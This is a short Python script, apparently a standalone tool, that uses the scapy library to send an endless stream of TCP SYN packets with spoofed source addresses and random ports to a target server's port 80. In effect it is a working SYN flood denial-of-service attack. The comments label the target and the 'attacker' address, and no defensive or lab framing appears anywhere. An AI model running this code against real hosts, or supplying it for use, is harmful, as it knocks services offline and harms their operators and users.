import random
from scapy.all import *

target_ip = "192.168.1.1" # IP address of the target server
target_port = 80 # Port number of the target service
spoof_ip = "10.0.0.1" # IP address of the attacker

while True:
    source_port = random.randint(1024,65535)
    initial_seq_num = random.randint(0,4294967295)
    
    ip = IP(src=spoof_ip, dst=target_ip)
    tcp = TCP(sport=source_port, dport=target_port, flags="S", seq=initial_seq_num)
    
    packet = ip/tcp
    send(packet, verbose=0)
